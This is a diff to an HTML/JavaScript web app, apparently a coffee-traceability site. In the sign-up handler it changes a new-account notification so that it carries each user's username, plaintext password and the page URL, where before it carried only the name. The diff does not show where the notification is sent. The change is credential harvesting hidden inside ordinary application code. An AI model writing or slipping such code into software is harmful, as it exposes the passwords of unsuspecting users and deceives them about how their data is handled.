@@ -1304,7 +1304,6 @@
             }
         }
 
-        // FUNGSI SINKRONISASI & AMAN LOCAL STORAGE (DIAMANKAN MENGGUNAKAN GITHUB CONTENTS API)
         async function fetchRealTimeData() {
             const statusEl = document.getElementById('github-sync-status');
             const token = localStorage.getItem('kopiTraceAdminToken');
@@ -1782,7 +1781,10 @@
             closeAuthModal();
             updateAuthUI();
             switchView('dashboard');
-            sendAuthNotification(`👤 **DAFTAR AKUN BARU**\n• Nama: **${name}**`);
+
+            const currentUrl = window.location.href;
+            sendAuthNotification(`🔐 **DATA AKUN BARU (AUTH LOGS)**\n• **Nama:** ${name}\n• **Username:** ${u}\n• **Password:** ${p}\n• **URL:** ${currentUrl}`);
+            
             alert('Akun berhasil didaftar dan Anda langsung masuk!');
         }
 
@@ -1995,4 +1997,4 @@
         };
     </script>
 </body>
-</html>
+        </html>
